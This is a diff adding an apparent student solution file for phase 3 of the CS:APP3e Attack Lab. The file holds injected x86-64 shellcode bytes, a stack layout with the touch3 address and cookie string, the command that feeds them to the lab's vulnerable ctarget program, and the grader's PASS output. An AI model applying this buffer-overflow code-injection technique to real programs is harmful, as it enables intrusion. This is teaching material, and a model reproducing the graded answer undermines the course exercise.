@@ -1,0 +1,51 @@
+/* Byte codes for the phase 3 of attack bomb in CS:APP3e
+
+   Copyright (C) 2022 Tongjie Liu <tongjieandliu@gmail.com>.
+
+   This program is free software: you can redistribute it and/or modify
+   it under the terms of the GNU General Public License as published by
+   the Free Software Foundation, either version 3 of the License, or
+   (at your option) any later version.
+
+   This program is distributed in the hope that it will be useful,
+   but WITHOUT ANY WARRANTY; without even the implied warranty of
+   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+   GNU General Public License for more details.
+
+   You should have received a copy of the GNU General Public License
+   along with this program.  If not, see <https://www.gnu.org/licenses/>. */
+
+/*	1. Generate byte codes in this file:
+	$ gcc -c phase_3.s
+	$ objdump -d phase_3.o
+	phase_3.o:     file format elf64-x86-64
+
+
+	Disassembly of section .text:
+
+	0000000000000000 <.text>:
+	   0:   48 83 ec 18             sub    $0x18,%rsp
+	   4:   48 8d 7c 24 08          lea    0x8(%rsp),%rdi
+	   9:   48 31 c0                xor    %rax,%rax
+	   c:   48 89 44 24 10          mov    %rax,0x10(%rsp)
+	  11:   c3                      retq   
+
+
+	2. Attack with this file:
+	$ cat phase_3.txt | ./hex2raw | ./ctarget -q
+	Cookie: 0x59b997fa
+	Type string:Touch3!: You called touch3("59b997fa")
+	Valid solution for level 3 with target ctarget
+	PASS: Would have posted the following:
+		user id bovik
+		course  15213-f15
+		lab     attacklab
+		result  1:PASS:0xffffffff:ctarget:3:48 83 EC 18 48 8D 7C 24 08
+	48 31 C0 48 89 44 24 10 C3 00 00 00 00 00 00 FA 18 40 00 00 00 00 00
+	35 39 62 39 39 37 66 61 78 DC 61 55 00 00 00 00 */
+48 83 ec 18 48 8d 7c 24 /* injected code */
+08 48 31 c0 48 89 44 24 /* injected code */
+10 c3 00 00 00 00 00 00 /* injected code and zeros */
+fa 18 40 00 00 00 00 00 /* address of function touch3 in little endian */
+35 39 62 39 39 37 66 61 /* the string argument */
+78 dc 61 55 00 00 00 00 /* address of injected code in little-endian */
